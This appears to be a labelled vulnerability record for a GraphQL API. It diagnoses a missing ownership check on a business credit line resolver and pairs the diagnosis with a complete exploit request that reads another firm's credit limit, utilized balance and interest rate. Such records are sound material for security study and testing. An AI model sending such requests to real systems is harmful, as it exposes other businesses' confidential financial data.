diagnosis: The GraphQL field resolves sensitive commercial credit line terms and utilized balances using a DataLoader. It omits checking whether info.context['current_user'].business_id owns the requested credit line record, allowing any authenticated commercial user to inspect lines of credit, debt utilization, and interest rates of competing businesses.
exploit_request:
POST /graphql HTTP/1.1
Host: api.capitalfintech.io
Authorization: Bearer <commercial_user_jwt>
Content-Type: application/json

{"query": "query { businessCreditLine(id: \"93e4a281-2291-49b0-811c-cc8102914801\") { creditLimit utilizedBalance interestRate } }"}
